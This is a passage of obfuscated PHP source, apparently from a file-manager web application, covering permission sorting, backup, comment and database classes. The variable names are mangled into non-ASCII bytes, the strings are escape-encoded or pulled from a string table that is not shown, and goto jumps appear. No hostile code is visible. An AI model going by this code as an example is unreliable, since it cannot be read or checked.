$ûÌå²É[12], $ûÌå²É[413] => 1, $ûÌå²É[1859] => $ûÌå²É[1846], $ûÌå²É[1858] => 1, $ûÌå²É[1283] => 0, $ûÌå²É[1860] => 0); $‚ÚãÃÔï = array_merge($äéââß¯, $‚ÚãÃÔï); $‚ÚãÃÔï[$ûÌå²É[1860]] = $this->getSort(); $this->filterAuth($‚ÚãÃÔï[$ûÌå²É[413]]); return parent::insert($‚ÚãÃÔï); } private function getSort() { $ìÑŠˆ·¢ =& $_SERVER[ñˆ‹ß¿÷]; $Ë®âÎ½ = parent::listData(); $ö“É×ØÀ = array_to_keyvalue($Ë®âÎ½, $ìÑŠˆ·¢[12], $ìÑŠˆ·¢[1860]); return empty($ö“É×ØÀ) ? 0 : max($ö“É×ØÀ) + 1; } private function filterAuth(&$ñèˆÀâÂ) { if (!$ñèˆÀâÂ) { return; } $«„¾É× = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $¥Œœ€°ç = array(); foreach ($«„¾É× as $‰İıæòÀ) { if ($ñèˆÀâÂ & $‰İıæòÀ) { $¥Œœ€°ç[] = $‰İıæòÀ; } } if (in_array(self::AUTH_ROOT, $¥Œœ€°ç)) { $ñèˆÀâÂ = array_sum($«„¾É×); return; } $ÌŠ¸ìß = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($¥Œœ€°ç as $‰İıæòÀ) { if (isset($ÌŠ¸ìß[$‰İıæòÀ])) { $¥Œœ€°ç = array_merge($¥Œœ€°ç, $ÌŠ¸ìß[$‰İıæòÀ]); } } $¥Œœ€°ç[] = self::AUTH_SHOW; $ñèˆÀâÂ = array_sum(array_unique($¥Œœ€°ç)); } public function sort($û©İÁû½, $ Óóãë) { return parent::update($û©İÁû½, $ Óóãë); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\142\141\143\x6b\x75\160\114\151\163\164"; public $field = array("\x69\157", "\156\x61\155\x65", "\163\x74\141\164\x75\x73", "\x63\x6f\x6e\x74\145\156\x74", "\155\141\156\x75\141\x6c", "\162\145\163\165\154\x74", "\164\x69\x6d\145\x46\x72\x6f\155", "\x74\151\x6d\x65\124\x6f"); public function config() { $Ì†‰áîò =& $_SERVER[ñˆ‹ß¿÷]; $îÕ÷Â‡• = Model($Ì†‰áîò[777])->get($Ì†‰áîò[787]); $îÕ÷Â‡• = json_decode($îÕ÷Â‡•, !0); $îÕ÷Â‡• = is_array($îÕ÷Â‡•) ? $îÕ÷Â‡• : array(); if (!isset($îÕ÷Â‡•[$Ì†‰áîò[762]])) { $îÕ÷Â‡•[$Ì†‰áîò[762]] = $Ì†‰áîò[88]; } unset($îÕ÷Â‡•[$Ì†‰áîò[1634]]); Action($Ì†‰áîò[1861])->taskInit(); Model($Ì†‰áîò[1633])->cacheClear(); $íÔúôÄ  = $Ì†‰áîò[1862]; $„şÍîî = Model($Ì†‰áîò[1863])->findByKey($Ì†‰áîò[1652], $íÔúôÄ ); if (!$„şÍîî) { $„şÍîî = array(); } if (isset($„şÍîî[$Ì†‰áîò[203]])) { $„şÍîî[$Ì†‰áîò[203]] = json_decode($„şÍîî[$Ì†‰áîò[203]], !0); } if (isset($îÕ÷Â‡•[$Ì†‰áîò[203]])) { $„şÍîî[$Ì†‰áîò[203]][$Ì†‰áîò[1637]] = $îÕ÷Â‡•[$Ì†‰áîò[203]]; unset($îÕ÷Â‡•[$Ì†‰áîò[203]]); } return array_merge($„şÍîî, $îÕ÷Â‡•); } public function listData($½ÒâËé = false, $»™‰İ¨Š = "\155\157\144\x69\x66\x79\124\151\155\x65", $šóÈŠ¹¢ = false) { return parent::listData($½ÒâËé, $»™‰İ¨Š, !0); } public function lastItem() { $‰´í¬€Ù = $this->listData(); return !empty($‰´í¬€Ù[0]) ? $‰´í¬€Ù[0] : null; } public function kill($ƒš¦ĞŠµ) { $šşÓŠá =& $_SERVER[ñˆ‹ß¿÷]; $É£şÕµ = $this->listData($ƒš¦ĞŠµ); if (!$É£şÕµ || empty($É£şÕµ[$šşÓŠá[32]])) { return !0; } Task::kill($šşÓŠá[786]); Task::kill($šşÓŠá[807]); Task::kill($šşÓŠá[816]); $šæ†¦ = $É£şÕµ[$šşÓŠá[32]]; $„ˆ÷ÆïÔ = TEMP_FILES . $šşÓŠá[785] . $šæ†¦ . $šşÓŠá[8]; IO::remove($„ˆ÷ÆïÔ, !1); return $this->remove($ƒš¦ĞŠµ); } public function remove($šËÀ¤Ä) { $€Üºˆ‰™ = $this->listData($šËÀ¤Ä); if (!$€Üºˆ‰™) { return !0; } return $this->backupRemove($€Üºˆ‰™); } private function backupRemove($á”‘ö‰Ø) { parent::remove($á”‘ö‰Ø[$_SERVER[ñˆ‹ß¿÷][399]]); $¹’ÀÛÑ = $this->backupPath($á”‘ö‰Ø); IO::remove($¹’ÀÛÑ, !1); return !0; } private function backupPath($³ó™ëª) { $úøáõªû =& $_SERVER[ñˆ‹ß¿÷]; $Ëäë“”š = $³ó™ëª[$úøáõªû[32]]; $àƒæû¶Ø = Model($úøáõªû[777])->get($úøáõªû[778]); $·äšö‡ = substr(md5($úøáõªû[779] . $àƒæû¶Ø . $Ëäë“”š), 0, 8); return "\x7b\151\x6f\x3a{$³ó™ëª[$úøáõªû[759]]}\x7d\57\x64\141\164\x61\x62\141\x73\145\x2f\x62\141\x63\153\x75\160\57" . $Ëäë“”š . $úøáõªû[11] . $·äšö‡; } public function start() { $Á©˜èÖ“ =& $_SERVER[ñˆ‹ß¿÷]; if ($GLOBALS[$Á©˜èÖ“[6]][$Á©˜èÖ“[89]][$Á©˜èÖ“[1864]] != $Á©˜èÖ“[88]) { return !0; } $ÙÛ¢Ìö = $this->config(); if (!$ÙÛ¢Ìö || $ÙÛ¢Ìö[$Á©˜èÖ“[1634]] != $Á©˜èÖ“[88]) { return !1; } $ì’Í«µğ = $this->process(); foreach ($ì’Í«µğ as $Åü±ÆâÆ) { if ($Åü±ÆâÆ) { return Task::restart($Åü±ÆâÆ[$Á©˜èÖ“[399]]); } } $î×®º£æ = new Backup(); $ø‡ã = $î×®º£æ->db(); if ($ø‡ã) { $ø‡ã = $î×®º£æ->dbFile(); if ($ø‡ã && $ÙÛ¢Ìö[$Á©˜èÖ“[762]] == $Á©˜èÖ“[197]) { $ø‡ã = $î×®º£æ->file(); } } Backup::set(array($Á©˜èÖ“[757] => 1, $Á©˜èÖ“[497] => time())); return !0; } public function process() { $¬Ò¥ÌÇÌ =& $_SERVER[ñˆ‹ß¿÷]; $ƒúşáÉá = array($¬Ò¥ÌÇÌ[765] => Task::get($¬Ò¥ÌÇÌ[786]), $¬Ò¥ÌÇÌ[769] => Task::get($¬Ò¥ÌÇÌ[807]), $¬Ò¥ÌÇÌ[199] => Task::get($¬Ò¥ÌÇÌ[816])); $—´«ÉÛ€ = !1; foreach ($ƒúşáÉá as &$…Àï¡€œ) { if ($—´«ÉÛ€) { $…Àï¡€œ = !1; continue; } if ($…Àï¡€œ) { $Ù·ÈçÕİ = intval(_get($…Àï¡€œ, $¬Ò¥ÌÇÌ[1669], 0)); if (time() - $Ù·ÈçÕİ > 7200) { Task::kill($…Àï¡€œ[$¬Ò¥ÌÇÌ[399]]); $—´«ÉÛ€ = !0; $…Àï¡€œ = !1; } } } return $ƒúşáÉá; } public function restore() { $ÙÖ¡¾ÊŒ =& $_SERVER[ñˆ‹ß¿÷]; ActionCall($ÙÖ¡¾ÊŒ[1067], !0, 1); ActionCall($ÙÖ¡¾ÊŒ[1067], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\155\x65\156\x74"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\155\x65" => "\143\x6f\x6d\x6d\145\x6e\164\x5f\x6d\145\164\141", "\155\x65\164\141\x46\x69\145\x6c\x64" => "\143\157\155\x6d\x65\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Ç·“±ª) { $¡Î‡ÈË„ =& $_SERVER[ñˆ‹ß¿÷]; if ($Ç·“±ª[$¡Î‡ÈË„[1865]]) { $—ïë£¢° = $this->where(array($¡Î‡ÈË„[1866] => $Ç·“±ª[$¡Î‡ÈË„[1865]]))->find(); if (!$—ïë£¢° || $—ïë£¢°[$¡Î‡ÈË„[411]] != $Ç·“±ª[$¡Î‡ÈË„[411]] || $—ïë£¢°[$¡Î‡ÈË„[505]] != $Ç·“±ª[$¡Î‡ÈË„[505]]) { return !1; } $this->where(array($¡Î‡ÈË„[1866] => $Ç·“±ª[$¡Î‡ÈË„[1865]]))->setAdd($¡Î‡ÈË„[1867], 1); } $Ç·“±ª[$¡Î‡ÈË„[1868]] = 0; $Ç·“±ª[$¡Î‡ÈË„[1867]] = 0; $Ç·“±ª[$¡Î‡ÈË„[757]] = 1; return $this->add($Ç·“±ª); } public function commentCount($Œ¦‰­Ô¹, $åù›·Ê¯, $ÏêÕÙş¨ = false) { $À®Íº³® =& $_SERVER[ñˆ‹ß¿÷]; if (!$Œ¦‰­Ô¹) { return array(); } if (is_string($Œ¦‰­Ô¹) || is_int($Œ¦‰­Ô¹)) { $Œ¦‰­Ô¹ = array($Œ¦‰­Ô¹); } $®Î¹ïîÃ = array($À®Íº³®[505], $À®Íº³®[1869] => $À®Íº³®[500]); $ÄÚñ›ÇÀ = array($À®Íº³®[505] => array($À®Íº³®[7], $Œ¦‰­Ô¹), $À®Íº³®[411] => $åù›·Ê¯); if ($ÏêÕÙş¨) { $ÄÚñ›ÇÀ[$À®Íº³®[1664]] = $ÏêÕÙş¨; } $Œ—‘‚Ù¦ = $this->field($®Î¹ïîÃ)->where($ÄÚñ›ÇÀ)->group($À®Íº³®[505])->select(); return array_to_keyvalue($Œ—‘‚Ù¦, $À®Íº³®[505], $À®Íº³®[500]); } public function starTarget($‘èÚÌÆ, $¼Ê¹¼Í) { $İ’ÙùÍä =& $_SERVER[ñˆ‹ß¿÷]; $°¬‘ÓÍÓ = $‘èÚÌÆ + self::TYPE_STAR_OFFSET; $ìƒ§‘ØÚ = array($İ’ÙùÍä[1664] => USER_ID, $İ’ÙùÍä[411] => $°¬‘ÓÍÓ, $İ’ÙùÍä[505] => $¼Ê¹¼Í); $ÔÜşÊğƒ = $this->where($ìƒ§‘ØÚ)->find(); if ($ÔÜşÊğƒ) { return $this->where(array($İ’ÙùÍä[399] => $ÔÜşÊğƒ[$İ’ÙùÍä[399]]))->delete(); } $ÇóŠ‘ëª = array($İ’ÙùÍä[1865] => 0, $İ’ÙùÍä[1664] => USER_ID, $İ’ÙùÍä[757] => 1, $İ’ÙùÍä[762] => $İ’ÙùÍä[12], $İ’ÙùÍä[411] => $°¬‘ÓÍÓ, $İ’ÙùÍä[505] => $¼Ê¹¼Í, $İ’ÙùÍä[1868] => 0, $İ’ÙùÍä[1867] => 0); return $this->add($ÇóŠ‘ëª); } public function starTargetCount($òØÖºøó, $âËòÄŒå) { $°ÉøŸ¯ =& $_SERVER[ñˆ‹ß¿÷]; $Ä¬’»•Ï = $âËòÄŒå + self::TYPE_STAR_OFFSET; $ÃéÍÊüª = $this->commentCount($òØÖºøó, $Ä¬’»•Ï); $şñƒÛİÇ = $this->commentCount($òØÖºøó, $Ä¬’»•Ï, USER_ID); return array($°ÉøŸ¯[1870] => $ÃéÍÊüª, $°ÉøŸ¯[1871] => $şñƒÛİÇ); } public function starTargetUserList($²Æ²áÖõ, $†ê¸Î±‚) { $ÓÏá«ùö =& $_SERVER[ñˆ‹ß¿÷]; $­îÛ×¡ = $²Æ²áÖõ + self::TYPE_STAR_OFFSET; $È¼Şğ´² = array($ÓÏá«ùö[505] => $†ê¸Î±‚, $ÓÏá«ùö[411] => $­îÛ×¡); $ô¾¥™Ø = $this->where($È¼Şğ´²)->count(); $Õ¼Ã²¥Û = array($ÓÏá«ùö[255] => $ô¾¥™Ø, $ÓÏá«ùö[1872] => array()); if (!$ô¾¥™Ø) { return $Õ¼Ã²¥Û; } $ø†Áø«Ø = $this->field($ÓÏá«ùö[1664])->where($È¼Şğ´²)->limit(500)->select(); $ø†Áø«Ø = array_to_keyvalue($ø†Áø«Ø, $ÓÏá«ùö[12], $ÓÏá«ùö[1664]); $Õ¼Ã²¥Û[$ÓÏá«ùö[1872]] = Model($ÓÏá«ùö[513])->userListInfo($ø†Áø«Ø); return $Õ¼Ã²¥Û; } public function prasiseUserList($ú¹Áëıú) { $­àúçÈ =& $_SERVER[ñˆ‹ß¿÷]; $Ê×ŒÕõ = array($­àúçÈ[1873] => $ú¹Áëıú); $ÜşĞ®â¯ = $this->where($Ê×ŒÕõ)->find(); $€œèÉ = _get($ÜşĞ®â¯, $­àúçÈ[1868], 0); $ü¡Ÿô´ = array($­àúçÈ[255] => $€œèÉ, $­àúçÈ[1872] => array()); if (!$€œèÉ) { return $ü¡Ÿô´; } $ø®Ê»éä = Model($­àúçÈ[1874])->field($­àúçÈ[1664])->where($Ê×ŒÕõ)->limit(500)->select(); $ø®Ê»éä = array_to_keyvalue($ø®Ê»éä, $­àúçÈ[12], $­àúçÈ[1664]); $ü¡Ÿô´[$­àúçÈ[1872]] = Model($­àúçÈ[513])->userListInfo($ø®Ê»éä); return $ü¡Ÿô´; } public function remove($¹‰Šıë±) { $æªå¾îú =& $_SERVER[ñˆ‹ß¿÷]; $ƒÖÁ™Ø¾ = array($æªå¾îú[1866] => $¹‰Šıë±); $Ó‚¶ÜÛ« = $this->where($ƒÖÁ™Ø¾)->find(); if ($Ó‚¶ÜÛ«[$æªå¾îú[1865]]) { $this->where(array($æªå¾îú[1866] => $Ó‚¶ÜÛ«[$æªå¾îú[1865]]))->setAdd($æªå¾îú[1867], -1); } return $this->where($ƒÖÁ™Ø¾)->delete(); } public function edit($àô™¤ñ, $öÍ•¥“µ) { $úê³Ğ² =& $_SERVER[ñˆ‹ß¿÷]; $ ÕÄÈæ = array($úê³Ğ²[1866] => $àô™¤ñ); return $this->where($ ÕÄÈæ)->save(array($úê³Ğ²[1875] => $öÍ•¥“µ)); } public function prasise($íè¥Ó—¤) { $©´ÇÊ¦ =& $_SERVER[ñˆ‹ß¿÷]; $ü–øÅä = Model($©´ÇÊ¦[1876]); $•¦œ³ü = array($©´ÇÊ¦[1866] => $íè¥Ó—¤, $©´ÇÊ¦[1655] => USER_ID); $‚¾ı²”Ô = $ü–øÅä->where($•¦œ³ü)->find(); if (!$‚¾ı²”Ô) { $ü–øÅä->add($•¦œ³ü); $¶£ìÑÜü = $this->where(array($©´ÇÊ¦[1866] => $íè¥Ó—¤))->setAdd($©´ÇÊ¦[1868], 1); } else { $ü–øÅä->where($•¦œ³ü)->delete(); $¶£ìÑÜü = $this->where(array($©´ÇÊ¦[1866] => $íè¥Ó—¤))->setAdd($©´ÇÊ¦[1868], -1); } return $¶£ìÑÜü; } public function targetInfo($¦ƒÃèûĞ, $ à˜üÄÁ) { $„‚¸÷Êà =& $_SERVER[ñˆ‹ß¿÷]; $éÃÙÄî€ = array($„‚¸÷Êà[586] => $¦ƒÃèûĞ, $„‚¸÷Êà[587] => $ à˜üÄÁ); $·‘’°ô¦ = $this->where($éÃÙÄî€)->count(); $Ü£Áë’Ç = "\x52\x49\107\110\x54\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\143\x6f\x6d\155\x65\x6e\x74\x5f\160\162\141\151\163\x65\x20\163\x74\x61\x72\40\x6f\x6e\x20\143\157\155\155\145\x6e\x74\x2e\143\x6f\x6d\x6d\145\156\164\111\104\x20\x3d\40\x73\164\141\x72\56\x63\x6f\155\x6d\145\x6e\164\x49\x44"; $ ®îñ° = $this->alias($„‚¸÷Êà[354])->where($éÃÙÄî€)->join($Ü£Áë’Ç, $„‚¸÷Êà[1877])->count(); $šğ×¿Õ¢ = array($„‚¸÷Êà[1878] => $·‘’°ô¦, $„‚¸÷Êà[1879] => $ ®îñ°); return $šğ×¿Õ¢; } public function listData($¼¨­ÏÊÄ) { $Àö´ŸÊ =& $_SERVER[ñˆ‹ß¿÷]; if (isset($¼¨­ÏÊÄ[$Àö´ŸÊ[1880]])) { if ($¼¨­ÏÊÄ[$Àö´ŸÊ[1880]]) { $¼¨­ÏÊÄ[$Àö´ŸÊ[1873]] = array($Àö´ŸÊ[1021], intval($¼¨­ÏÊÄ[$Àö´ŸÊ[1880]])); } unset($¼¨­ÏÊÄ[$Àö´ŸÊ[1880]]); } if (isset($¼¨­ÏÊÄ[$Àö´ŸÊ[1881]])) { if ($¼¨­ÏÊÄ[$Àö´ŸÊ[1881]]) { $¼¨­ÏÊÄ[$Àö´ŸÊ[1873]] = array($Àö´ŸÊ[1018], intval($¼¨­ÏÊÄ[$Àö´ŸÊ[1881]])); } unset($¼¨­ÏÊÄ[$Àö´ŸÊ[1881]]); } return $this->_listData($¼¨­ÏÊÄ); } private function _listData($ÖÅ¢ÛŒ) { $ÎûÔ£¹å =& $_SERVER[ñˆ‹ß¿÷]; $õÃÊÁı = $this->where($ÖÅ¢ÛŒ)->_makeOrder()->selectPage(100); $this->_listAppendParent($õÃÊÁı[$ÎûÔ£¹å[369]]); $this->_listAppendUser($õÃÊÁı[$ÎûÔ£¹å[369]]); $this->_listAppendMeta($õÃÊÁı[$ÎûÔ£¹å[369]]); return $õÃÊÁı; } private function _makeOrder() { $ÃêûÆ’Ì =& $_SERVER[ñˆ‹ß¿÷]; $©ìƒÚû® = array($ÃêûÆ’Ì[1868], $ÃêûÆ’Ì[1867], $ÃêûÆ’Ì[200]); $”£”¸…– = Input::get($ÃêûÆ’Ì[457], $ÃêûÆ’Ì[7], $ÃêûÆ’Ì[423], $©ìƒÚû®); $Ô¥Â–†¢ = Input::get($ÃêûÆ’Ì[458], $ÃêûÆ’Ì[7], $ÃêûÆ’Ì[1657], array($ÃêûÆ’Ì[1882], $ÃêûÆ’Ì[453])); $ìˆÔİ‰ò = $”£”¸…– . $ÃêûÆ’Ì[53] . $Ô¥Â–†¢; return $this->order($ìˆÔİ‰ò); } private function _listAppendParent(&$òß¯Ú¬Í) { $µÖÒ”… =& $_SERVER[ñˆ‹ß¿÷]; $ˆ¥¾¡¨« = array_unique(array_to_keyvalue($òß¯Ú¬Í, $µÖÒ”…[12], $µÖÒ”…[1865])); $ˆ¥¾¡¨« = array_remove_value($ˆ¥¾¡¨«, $µÖÒ”…[197]); if (!$ˆ¥¾¡¨«) { return; } $ÜÌêı‹Ş = $this->where(array($µÖÒ”…[1866] => array($µÖÒ”…[7], $ˆ¥¾¡¨«)))->select(); $ÜÌêı‹Ş = array_to_keyvalue($ÜÌêı‹Ş, $µÖÒ”…[1873]); foreach ($òß¯Ú¬Í as &$è¾úˆ¹‘) { if (isset($ÜÌêı‹Ş[$è¾úˆ¹‘[$µÖÒ”…[1865]]])) { $è¾úˆ¹‘[$µÖÒ”…[1883]] = $ÜÌêı‹Ş[$è¾úˆ¹‘[$µÖÒ”…[1865]]]; } } unset($è¾úˆ¹‘); } private function _listAppendUser(&$ì‚Ğî°è) { $ûµ¹Ş• =& $_SERVER[ñˆ‹ß¿÷]; $ø™ŒåÅÊ = array_unique(array_to_keyvalue($ì‚Ğî°è, $ûµ¹Ş•[12], $ûµ¹Ş•[1664])); $ø™ŒåÅÊ = array_remove_value($ø™ŒåÅÊ, $ûµ¹Ş•[197]); if (count($ø™ŒåÅÊ) == 0) { return; } foreach ($ì‚Ğî°è as $’öˆ†á) { if (isset($’öˆ†á[$ûµ¹Ş•[1883]])) { $ø™ŒåÅÊ[] = $’öˆ†á[$ûµ¹Ş•[1883]][$ûµ¹Ş•[1664]]; } } $ª”Î³ÁÑ = Model($ûµ¹Ş•[535])->userListInfo($ø™ŒåÅÊ); foreach ($ì‚Ğî°è as &$’öˆ†á) { $’öˆ†á[$ûµ¹Ş•[600]] = $ª”Î³ÁÑ[$’öˆ†á[$ûµ¹Ş•[1664]]]; if (isset($’öˆ†á[$ûµ¹Ş•[1883]])) { $’öˆ†á[$ûµ¹Ş•[1883]][$ûµ¹Ş•[600]] = $ª”Î³ÁÑ[$’öˆ†á[$ûµ¹Ş•[1883]][$ûµ¹Ş•[1664]]]; } } unset($’öˆ†á); } private function _listAppendMeta(&$ÔÏ£ã¿ñ) { $á®¾¹İ =& $_SERVER[ñˆ‹ß¿÷]; $ÑäÒØ÷Š = array_unique(array_to_keyvalue($ÔÏ£ã¿ñ, $á®¾¹İ[12], $á®¾¹İ[1873])); $ÑäÒØ÷Š = array_remove_value($ÑäÒØ÷Š, $á®¾¹İ[197]); if (!$ÑäÒØ÷Š) { return; } foreach ($ÔÏ£ã¿ñ as $ƒ‹É‹ıî) { if (isset($ƒ‹É‹ıî[$á®¾¹İ[1883]])) { $ÑäÒØ÷Š[] = $ƒ‹É‹ıî[$á®¾¹İ[1883]][$á®¾¹İ[1873]]; } } $ÍÎÂË²¹ = $this->metaList($ÑäÒØ÷Š); if (!$ÍÎÂË²¹) { return !1; } foreach ($ÔÏ£ã¿ñ as &$ƒ‹É‹ıî) { $ƒ‹É‹ıî[$á®¾¹İ[466]] = $ÍÎÂË²¹[$ƒ‹É‹ıî[$á®¾¹İ[1873]]]; if (isset($ƒ‹É‹ıî[$á®¾¹İ[1883]])) { $ƒ‹É‹ıî[$á®¾¹İ[1883]][$á®¾¹İ[466]] = $ÍÎÂË²¹[$ƒ‹É‹ıî[$á®¾¹İ[1883]][$á®¾¹İ[1873]]]; } } unset($ƒ‹É‹ıî); } private function metaList($¸¤Ë«¶Œ) { $·ûú–Ê¯ =& $_SERVER[ñˆ‹ß¿÷]; if (!$¸¤Ë«¶Œ) { return array(); } $Â›Õ÷¾õ = array($·ûú–Ê¯[1873] => array($·ûú–Ê¯[7], $¸¤Ë«¶Œ)); $ü‰‘ÕÜ¾ = Model($·ûú–Ê¯[1884])->where($Â›Õ÷¾õ)->select(); $ü‰‘ÕÜ¾ = array_to_keyvalue_group($ü‰‘ÕÜ¾, $·ûú–Ê¯[1873]); foreach ($ü‰‘ÕÜ¾ as $’­ÁùÏ– => $ä·„…×è) { $È˜èÆÅè = array(); foreach ($ä·„…×è as $×ûî¹¦…) { $È˜èÆÅè[$×ûî¹¦…[$·ûú–Ê¯[94]]] = $×ûî¹¦…[$·ûú–Ê¯[374]]; } $ü‰‘ÕÜ¾[$’­ÁùÏ–] = $È˜èÆÅè; } return $ü‰‘ÕÜ¾ ? $ü‰‘ÕÜ¾ : array(); } } goto a¡©ôø—Ş²; f”šÚŸó¬: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\x6e\145\x71" => "\x3c\x3e", "\x67\x74" => "\76", "\x65\x67\x74" => "\76\75", "\x6c\x74" => "\74", "\x65\x6c\164" => "\x3c\x3d", "\156\x6f\x74\x6c\x69\x6b\145" => "\x4e\x4f\x54\40\114\111\113\x45", "\x6c\151\x6b\x65" => "\114\x49\x4b\x45", "\151\x6e" => "\x49\116", "\x6e\x6f\x74\151\156" => "\x4e\117\x54\40\111\116", "\x6e\157\164\40\151\x6e" => "\116\117\x54\x20\111\116", "\142\145\164\167\x65\x65\156" => "\x42\x45\124\127\105\105\x4e", "\x6e\x6f\x74\142\x65\x74\167\145\x65\x6e" => "\116\x4f\124\x20\102\105\124\x57\105\x45\x4e", "\x6e\157\x74\40\x62\x65\x74\167\145\x65\156" => "\x4e\117\124\x20\x42\x45\124\127\105\x45\x4e"); protected $selectSql = "\123\105\114\105\103\x54\x25\104\111\x53\x54\x49\116\x43\x54\45\x20\45\x46\x49\x45\x4c\x44\x25\x20\x46\x52\117\x4d\x20\45\x54\101\102\x4c\x45\45\x25\x4a\x4f\x49\x4e\x25\x25\127\x48\105\122\x45\45\x25\107\122\x4f\125\120\45\45\x48\101\126\111\x4e\x47\x25\45\117\122\104\105\x52\x25\45\114\111\115\111\x54\45\x20\45\x55\116\x49\117\116\45\x25\x43\x4f\x4d\115\105\116\124\45"; protected $bind = array(); public static function getInstance() { $Šã€ß« = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ñˆ‹ß¿÷][967], $Šã€ß«); } public function factory($—¤¤ŞÏ = '') { $¤Œİ¤¿Ô =& $_SERVER[ñˆ‹ß¿÷]; $—¤¤ŞÏ = $this->parseConfig($—¤¤ŞÏ); if (empty($—¤¤ŞÏ[$¤Œİ¤¿Ô[968]])) { think_exception(think_lang($¤Œİ¤¿Ô[969])); } $this->dbType = ucwords(strtolower($—¤¤ŞÏ[$¤Œİ¤¿Ô[968]])); $·½¸Ëä• = $¤Œİ¤¿Ô[970] . $this->dbType; if (class_exists($·½¸Ëä•)) { $öëœ¼¾ = new $·½¸Ëä•($—¤¤ŞÏ); if ($¤Œİ¤¿Ô[971] != strtolower($—¤¤ŞÏ[$¤Œİ¤¿Ô[968]])) { $öëœ¼¾->dbType = strtoupper($this->dbType); } else { $öëœ¼¾->dbType = $this->_getDsnType($—¤¤ŞÏ[$¤Œİ¤¿Ô[923]]); } } else { think_exception(think_lang($¤Œİ¤¿Ô[972]) . $¤Œİ¤¿Ô[973] . $·½¸Ëä•); } return $öëœ¼¾; } public function __call($°â£¤ĞÀ, $µŞğ”úö) { if (method_exists($this, $°â£¤ĞÀ)) { return call_user_func_array(array($this, $°â£¤ĞÀ), $µŞğ”úö); } } protected function _getDsnType($‘ßê¤Íä) { $ÚĞÌ¥®» = explode($_SERVER[ñˆ‹ß¿÷][4], $‘ßê¤Íä); $…Õ÷üÎÉ = strtoupper(trim($ÚĞÌ¥®»[0])); return $…Õ÷üÎÉ; } private function parseConfig($»ƒãîòˆ = '') { $¬šï§¥ =& $_SERVER[ñˆ‹ß¿÷]; if (!empty($»ƒãîòˆ) && is_string($»ƒãîòˆ)) { $»ƒãîòˆ = $this->parseDSN($»ƒãîòˆ); } elseif (is_array($»ƒãîòˆ)) { $»ƒãîòˆ = array_change_key_case($»ƒãîòˆ); $»ƒãîòˆ = array($¬šï§¥[968] => $»ƒãîòˆ[$¬šï§¥[974]], $¬šï§¥[895] => $»ƒãîòˆ[$¬šï§¥[975]], $¬šï§¥[896] => $»ƒãîòˆ[$¬šï§¥[976]], $¬šï§¥[893] => $»ƒãîòˆ[$¬šï§¥[977]], $¬šï§¥[894] => $»ƒãîòˆ[$¬šï§¥[978]], $¬šï§¥[21] => $»ƒãîòˆ[$¬šï§¥[979]], $¬šï§¥[923] => $»ƒãîòˆ[$¬šï§¥[980]], $¬šï§¥[17] => isset($»ƒãîòˆ[$¬šï§¥[981]]) ? $»ƒãîòˆ[$¬šï§¥[981]] : array()); } elseif (empty($»ƒãîòˆ)) { if (think_config($¬šï§¥[982]) && $¬šï§¥[971] != strtolower(think_config($¬šï§¥[983]))) { $»ƒãîòˆ = $this->parseDSN(think_config($¬šï§¥[982])); } else { $»ƒãîòˆ = array($¬šï§¥[968] => think_config($¬šï§¥[983]), $¬šï§¥[895] => think_config($¬šï§¥[984]), $¬šï§¥[896] => think_config($¬šï§¥[985]), $¬šï§¥[893] => think_config($¬šï§¥[986]), $¬šï§¥[894] => think_config($¬šï§¥[987]), $¬šï§¥[21] => think_config($¬šï§¥[246]), $¬šï§¥[923] => think_config($¬šï§¥[982]), $¬šï§¥[17] => think_config($¬šï§¥[988])); } } return $»ƒãîòˆ; } protected function initConnect($µéªüÏå = true) { if (1 == think_config($_SERVER[ñˆ‹ß¿÷][22])) { $this->_linkID = $this->multiConnect($µéªüÏå); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $õÓİ†×© => $õÇÏë€—) { $this->_linkID = $õÇÏë€—; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($íøÅ×—Û = false) { $à¦‚Æ‚ê =& $_SERVER[ñˆ‹ß¿÷]; static $¶×ü·ã = array(); static $Ê©Äıù’ = -1; if (empty($¶×ü·ã)) { foreach ($this->config as $ïİˆƒ×ı => $î‚º‹Ïç) { $¶×ü·ã[$ïİˆƒ×ı] = explode($à¦‚Æ‚ê[50], $î‚º‹Ïç); } } if (think_config($à¦‚Æ‚ê[989])) { if ($íøÅ×—Û || think_config($à¦‚Æ‚ê[395]) === !0) { $ÙØ÷ÁÀ… = floor(mt_rand(0, think_config($à¦‚Æ‚ê[990]) - 1)); $Ê©Äıù’ = $ÙØ÷ÁÀ…; } else { if (is_numeric(think_config($à¦‚Æ‚ê[991]))) { $ÙØ÷ÁÀ… = think_config($à¦‚Æ‚ê[991]); } else { $ÙØ÷ÁÀ… = floor(mt_rand(think_config($à¦‚Æ‚ê[990]), count($¶×ü·ã[$à¦‚Æ‚ê[893]]) - 1)); } } } else { $ÙØ÷ÁÀ… = 